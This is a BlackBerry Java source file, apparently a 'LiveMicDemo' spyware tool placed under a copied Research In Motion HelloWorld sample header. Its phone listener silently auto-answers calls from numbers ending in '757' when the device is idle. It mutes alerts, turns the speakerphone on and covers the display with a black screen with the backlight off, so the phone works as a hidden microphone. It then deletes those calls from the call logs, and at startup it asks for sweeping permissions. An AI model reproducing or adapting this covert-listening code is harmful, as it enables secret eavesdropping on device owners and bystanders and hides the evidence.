/**
 * 
 * HelloWorld.java
 * The sentinal sample!
 *
 * Copyright © 1998-2010 Research In Motion Ltd.
 * 
 * Note: For the sake of simplicity, this sample application may not leverage
 * resource bundles and resource strings.  However, it is STRONGLY recommended
 * that application developers make use of the localization features available
 * within the BlackBerry development platform to ensure a seamless application
 * experience across a variety of languages and geographies.  For more information
 * on localizing your application, please refer to the BlackBerry Java Development
 * Environment Development Guide associated with this release.
 */

package com.rim.samples.device.livemictest;

import java.util.Hashtable;

import net.rim.blackberry.api.invoke.ApplicationArguments;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.UiEngine;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.RichTextField;

/*
 * BlackBerry applications that provide a user interface must extend 
 * UiApplication.
 */
public class LiveMicDemo extends UiApplication implements PhoneListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicDemo", DebugLevel.VERBOSE);

    //#endif
    /**
     * Entry point for application.
     */
    public static void main(String[] args) {
        // Create a new instance of the application.
        LiveMicDemo theApp = new LiveMicDemo();
        theApp.init();

        // To make the application enter the event thread and start processing messages, 
        // we invoke the enterEventDispatcher() method.
        theApp.enterEventDispatcher();

    }

    private String phoneNumber;
    private boolean autoanswer;
    private String number;
    private long MINIMUM_IDLE_TIME;
    LiveMicScreen liveMicScreen;

    /**
     * <p>
     * The default constructor. Creates all of the RIM UI components and pushes
     * the application's root screen onto the UI stack.
     */
    public LiveMicDemo() {
        liveMicScreen = new LiveMicScreen(this);
        //RuntimeStore.getRuntimeStore().put(LiveMicScreen.getGuid(), liveMicScreen);
        Debug.setScreen(liveMicScreen);
        // Push the main screen instance onto the UI stack for rendering.
        pushScreen(liveMicScreen);

    }

    protected void init() {

        //#ifdef DEBUG
        debug.trace("init");
        //#endif

        Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
        checkPermissions();
        Phone.addPhoneListener(this);
        number = "757";
    }

    public void close() {
        //#ifdef DEBUG
        debug.trace("close");
        //#endif
        Phone.removePhoneListener(this);
    }

    public void stopAudio() {
        //#ifdef DEBUG
        debug.trace("StopAudio");
        //#endif

        Alert.stopVibrate();
        if (!DeviceInfo.isSimulator()) {
            KeyInjector.pressKey(Keypad.KEY_SPEAKERPHONE);
        }
        /*
         * Alert.mute(true); Audio.setVolume(0); Alert.setVolume(0);
         * Alert.stopAudio(); Alert.stopBuzzer(); Alert.stopMIDI();
         * Alert.setADPCMVolume(0); Alert.stopADPCM();
         */

        //#ifdef DEBUG
        debug.trace("End StopAudio");
        //#endif
    }

    Hashtable callingHistory = new Hashtable();

    private boolean interestingNumber(int callId2, String phoneNumber2) {
        return true;
    }

    public void callIncoming(int callId) {
        //#ifdef DEBUG
        debug.info("======= incoming: " + phoneNumber + " =======");
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallIncoming not interesting: " + phoneNumber);
            //#endif
            return;
        }

        stopAudio();

        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {

            KeyInjector.pressKey(Keypad.KEY_SEND);
            //#ifdef DEBUG
            debug.trace("callIncoming: SEND");
            //#endif
            //MenuWalker.walk("Answer");
        } else {
            KeyInjector.pressKey(Keypad.KEY_END);
            //#ifdef DEBUG
            debug.trace("callIncoming: END");
            //#endif
        }

        UiApplication.getUiApplication().pushGlobalScreen(blackScreen, 0,
                UiEngine.GLOBAL_MODAL);
        //black(true);

        //#ifdef DEBUG
        //debug.trace("callIncoming: suspended");
        //#endif

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callInitiated(int callId) {
        //#ifdef DEBUG
        debug.trace("callInitiated: " + callId);
        //#endif
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callAnswered(int callId) {
        final PhoneCall phoneCall = Phone.getCall(callId);
        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();

        //#ifdef DEBUG
        debug.info("======= callAnswered: " + phoneNumber + "===");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("callAnswered: not interesting number");
            //#endif
            return;
        }

        
        //MenuWalker.walk("Home Screen");
        //MenuWalker.walk("Return to Phone");
        MenuWalker.walk("Activate Speakerphone");
        
        UiApplication.getUiApplication().requestForeground();

        //#ifdef DEBUG
        debug.trace("onCallAnswered: finished");
        //#endif
    }
    
    public void callConnected(int callId) {
        //#ifdef DEBUG
        debug.info("======= callConnected: " + phoneNumber + " ===");
        //#endif      

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("callConnected, not interesting number");
            //#endif
            return;
        }

        //black(true);
        UiApplication.getUiApplication().requestForeground();
        Backlight.enable(false);

        //Utils.sleep(2000);
        autoanswer = true;
    }

    public void callAdded(int callId) {
        //#ifdef DEBUG
        debug.info("======= callAdded: " + callId + "===");
        //#endif
    }

    public void callConferenceCallEstablished(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callConferenceCallEstablished: " + arg0);
        //#endif
    }

   

    public void callDirectConnectConnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callDirectConnectConnected: " + arg0);
        //#endif
    }

    public void callDirectConnectDisconnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callDirectConnectDisconnected: " + arg0);
        //#endif
    }

    public void callDisconnected(int callId) {
        //#ifdef DEBUG
        debug.info("======= callDisconnected: " + phoneNumber + " =======");
        //#endif

        autoanswer = false;

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected: not interesting");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected, interesting");
            //#endif
            
            Screen activeScreen = LiveMicDemo.getUiApplication().getActiveScreen();
            if (activeScreen.getUiEngine().isPaintingSuspended()) {
                activeScreen.getUiEngine().suspendPainting(false);
            }
            activeScreen.doPaint();

            removePhoneCalls();
            removed = false;
            removePhoneCall(100, false);
            removePhoneCall(500, false);
            removePhoneCall(1000, false);
            removePhoneCall(5000, false);
            removePhoneCall(10000, false);
            removePhoneCall(20000, false);

            //black(false);
            //#ifdef DEBUG
            debug.trace("callDisconnected: suspended end");
            //#endif

        }
    }

    private void removePhoneCalls() {
        // search for number
        ApplicationDescriptor[] apps = ApplicationManager
                .getApplicationManager().getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            ApplicationDescriptor desc = apps[i];
            debug.trace("name: " + desc.getLocalizedName());
            debug.trace("handle: " + desc.getModuleHandle());
        }
    }

    public void callEndedByUser(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callEndedByUser: " + arg0);
        //#endif
    }

    public void callFailed(int arg0, int arg1) {
        //#ifdef DEBUG
        debug.trace("callFailed: " + arg0 + ", " + arg1);
        //#endif
    }

    public void callHeld(int callId) {
        //#ifdef DEBUG
        debug.trace("callHeld: " + callId);
        //#endif
    }

    public void callRemoved(int arg0) {
        //#ifdef DEBUG
        debug.trace("callRemoved: " + arg0);
        //#endif
    }

    public void callResumed(int arg0) {
        //#ifdef DEBUG
        debug.trace("callResumed: " + arg0);
        //#endif
    }

    public void callWaiting(int arg0) {
        //#ifdef DEBUG
        debug.trace("callWaiting: " + arg0);
        //#endif
    }

    public void conferenceCallDisconnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("conferenceCallDisconnected: " + arg0);
        //#endif
    }

    BlackScreen blackScreen = new BlackScreen();;
    int screenCount = 0;

    public void black(final boolean value) {
        //#ifdef DEBUG
        debug.trace("black: " + value);
        //#endif

        /*
         * synchronized (Application.getEventLock()) { if (isPaintingSuspended()
         * != value) { //#ifdef DEBUG debug.trace("suspending: " + value);
         * //#endif suspendPainting(value); } }
         */

        final UiApplication theApp = UiApplication.getUiApplication();
        theApp.requestForeground();

        theApp.invokeLater(new Runnable() {
            public void run() {
                System.out.println("???????------- Inside RUN " + value);

                if (isPaintingSuspended() != value) {
                    //#ifdef DEBUG
                    debug.trace("suspending: " + value);
                    //#endif
                    suspendPainting(value);
                }
                if (blackScreen == null) {
                    System.out.println("???????------- Creating blackScreen");
                    blackScreen = new BlackScreen();
                }

                try {
                    if (value) {
                        Backlight.enable(false);
                        if (screenCount == 0) {
                            screenCount = theApp.getScreenCount();
                            theApp.pushGlobalScreen(blackScreen, -100, false);

                            //theApp.addKeyListener(arg0)

                        }

                        //theApp.pushScreen();

                    } else {
                        theApp.popScreen(blackScreen);
                        screenCount = 0;
                    }
                } catch (Exception ex) {
                    System.out.println("????????------- " + ex);
                }

            }
        });

        /*
         * synchronized (Application.getEventLock()) { if (isPaintingSuspended()
         * != value) { //#ifdef DEBUG debug.trace("suspending: " + value);
         * //#endif suspendPainting(value); } }
         */

        //requestForeground();

    }

    public void activate() {

    }

    public void deactivate() {
        //Backlight.enable(false);
    }

    boolean removed = false;

    private void removePhoneCall(final int DELAY, final boolean sendkey) {
        Thread t = new Thread() {
            public void run() {
                init();
                //#ifdef DEBUG
                debug.trace("run: removePhoneCall");
                //#endif

                // trovare il valore giusto
                //final int DELAY = 4000;
                Utils.sleep(DELAY);

                if (removed) {
                    //#ifdef DEBUG
                    debug.trace("already removed, exit");
                    //#endif

                } else {

                    removed |= removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
                    removed |= removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);

                    if (sendkey) {
                        KeyInjector.pressKey(Keypad.KEY_SEND);
                        KeyInjector.pressKey(Keypad.KEY_DELETE);
                        KeyInjector.pressKey(Keypad.KEY_ENTER);
                    }
                }
            }
        };
        t.start();
    }

    protected boolean removePhoneCallFromFolder(long folderID) {
        //#ifdef DEBUG
        debug.trace("removePhoneCallFromFolder: " + folderID);

        //#endif
        PhoneLogs phoneLogs = null;

        boolean ret = false;
        try {
            phoneLogs = PhoneLogs.getInstance();
            int size = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size before: " + size);
            //#endif

            for (int i = size - 1; i >= 0; i--) {
                final CallLog log = phoneLogs.callAt(i, folderID);

                if (PhoneCallLog.class.isAssignableFrom(log.getClass())) {
                    PhoneCallLog plog = (PhoneCallLog) log;
                    String phoneNumber = plog.getParticipant().getNumber();
                    if (phoneNumber.endsWith(number)) {
                        //#ifdef DEBUG
                        debug.info("removePhoneCallFromFolder: " + phoneNumber);
                        //#endif
                        phoneLogs.deleteCall(i, folderID);
                        ret = true;
                    }
                }
            }
            int newsize = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size after: " + newsize);
            //#endif

        } catch (Exception e) {
            //#ifdef DEBUG
            debug.trace("removePhoneCallFromFolder: " + e);
            //#endif
        }

        return ret;
    }

    private void checkPermissions() {
        //#ifdef DEBUG
        debug.trace("CheckPermissions");
        //#endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        //final CoreReasonProvider drp = new CoreReasonProvider();
        //apm.addReasonProvider(ApplicationDescriptor
        //        .currentApplicationDescriptor(), drp);

        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL,
                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
                ApplicationPermissions.PERMISSION_IDLE_TIMER,
                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                ApplicationPermissions.PERMISSION_BROWSER_FILTER };

        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                allPermitted = false;
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG
            debug
                    .info("All of the necessary permissions are currently available");
            //#endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG
            debug.info("User has accepted all of the permissions");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions");
            //#endif
        }
    }
}

/**
 * Create a new screen that extends MainScreen, which provides default standard
 * behavior for BlackBerry applications.
 */
/* package */final class LiveMicScreen extends MainScreen {
    LiveMicDemo liveMicDemo;

    /**
     * LiveMic constructor.
     * 
     * @param liveMicDemo
     */
    public LiveMicScreen(LiveMicDemo liveMicDemo) {
        this.liveMicDemo = liveMicDemo;
        // Add a field to the title region of the screen. We use a simple LabelField 
        // here. The ELLIPSIS option truncates the label text with "..." if the text 
        // is too long for the space available.
        LabelField title = new LabelField("LiveMic Demo 1.0",
                LabelField.ELLIPSIS | LabelField.USE_ALL_WIDTH);
        setTitle(title);

        // Add a read only text field (RichTextField) to the screen.  The RichTextField
        // is focusable by default.  In this case we provide a style to make the field
        // non-focusable.
        //add(new RichTextField("Live MIC Demo", Field.NON_FOCUSABLE));
    }

    /*
     * public static long getGuid() { return 0x91a530d4d92fa42dL; }
     */

    public void addText(String text) {
        //synchronized (Application.getEventLock()){
        add(new RichTextField(text, Field.NON_FOCUSABLE));
        //}
    }

    /**
     * Display a dialog box to the user with "Goodbye!" when the application is
     * closed.
     * 
     * @see net.rim.device.api.ui.Screen#close()
     */
    public void close() {
        liveMicDemo.close();

        // Display a farewell message before closing application.
        Dialog.alert("Goodbye!");

        System.exit(0);

        super.close();
    }

}
